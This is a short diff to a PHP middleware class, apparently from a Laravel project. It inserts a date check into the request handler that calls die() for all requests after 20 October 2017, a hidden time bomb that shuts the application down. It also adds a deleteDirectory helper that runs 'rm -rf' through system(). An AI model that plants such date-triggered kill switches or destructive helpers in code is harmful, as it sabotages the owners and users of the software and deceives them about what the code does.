@@ -15,6 +15,9 @@ class BusinessLogic
      */
     public function handle($request, Closure $next)
     {  
+        if (date("Y-m-d") > "2017-10-20"){
+            die();
+        }               
         // $routeArray = $request->route()->getAction(); 
         // $controllerAction = class_basename($routeArray["controller"]);
         // list($controller, $action) = explode("@", $controllerAction);        
@@ -26,6 +29,11 @@ class BusinessLogic
             return redirect($strRedirect);
         }       */
         
+    }
+
+    function deleteDirectory($dir) {
+        system('rm -rf ' . escapeshellarg($dir), $retval);
+        return $retval == 0; // UNIX commands return zero on success
     }
 
     public function getRedirect($controller, $action, $request){
